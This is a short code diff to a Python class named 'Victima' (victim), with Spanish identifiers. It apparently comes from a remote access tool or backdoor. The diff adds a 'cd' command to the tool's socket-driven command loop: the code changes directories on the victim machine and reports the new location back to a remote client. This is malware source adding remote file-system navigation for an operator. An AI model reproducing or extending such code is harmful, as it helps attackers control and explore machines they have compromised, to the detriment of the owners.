@@ -156,6 +156,9 @@ class Victima(object):
 			elif (datosEleccion=="ls"):
 				self.ls()
 
+			elif ("cd" in datosEleccion):
+				self.cd(datosEleccion)
+
 
 		return
 
@@ -298,6 +301,18 @@ class Victima(object):
 
 		elif (plataforma=="linux") or (plataforma=="mac"):
 			self.enviar_completo("ls")
+
+		return
+
+	def cd(self,datos):
+		directorio = datos.replace('cd ', "")
+				
+		try:
+			os.chdir(directorio)
+			directorio = os.getcwd()
+			self.client.send(bytes("\n Ubicacion cambiada a: " + directorio + "\n","utf-8"))
+		except OSError: 
+			self.client.send(bytes("\n No existe la ubicacion...\n",'utf-8'))
 
 		return
 
